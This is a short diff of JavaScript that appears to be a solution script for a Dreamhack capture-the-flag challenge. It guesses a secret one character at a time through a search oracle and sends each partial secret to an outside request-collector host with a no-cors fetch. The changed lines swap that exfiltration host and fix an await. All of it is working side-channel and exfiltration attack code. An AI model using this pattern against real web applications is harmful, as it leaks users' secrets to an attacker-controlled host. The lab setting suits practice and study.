@@ -40,10 +40,10 @@
                     let found = false;
 
                     for (let c of chars) {
-                        sleep(300);
+                        await sleep(300);
                         if (await search(secret + c)) {
                             secret += c;
-                            fetch(`https://mkezmac.request.dreamhack.games?flag=${encodeURIComponent(secret)}`, {
+                            fetch(`https://gubujkt.request.dreamhack.games?flag=${encodeURIComponent(secret)}`, {
                                 mode: 'no-cors'
                             });
                             console.log(`found: ${secret}`);
